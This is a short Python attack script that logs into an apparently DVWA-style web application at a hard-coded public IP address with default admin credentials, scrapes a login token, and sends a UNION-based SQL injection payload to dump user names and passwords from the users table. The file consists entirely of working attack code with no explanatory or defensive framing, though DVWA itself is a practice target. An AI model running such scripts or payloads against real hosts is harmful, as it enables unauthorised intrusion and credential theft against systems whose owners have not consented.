
import requests
import re

session = requests.Session()
url = "http://31.97.117.123"

# Login with admin:password
login_page = session.get(f"{url}/login.php")
match = re.search(r"user_token'\s+value='([^']+)'", login_page.text)
user_token = match.group(1) if match else ""

data = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{url}/login.php", data=data, allow_redirects=True)
print("[+] Login successful!")

# Now let's try SQL injection to extract users
# First, let's try a simple injection to see what data we get
sqli_payload = "1' UNION SELECT NULL, user, password FROM users LIMIT 1 #"

sqli_response = session.get(f"{url}/vulnerabilities/sqli/?id={sqli_payload}")
print("\n[*] Testing SQL injection...")
print(sqli_response.text)


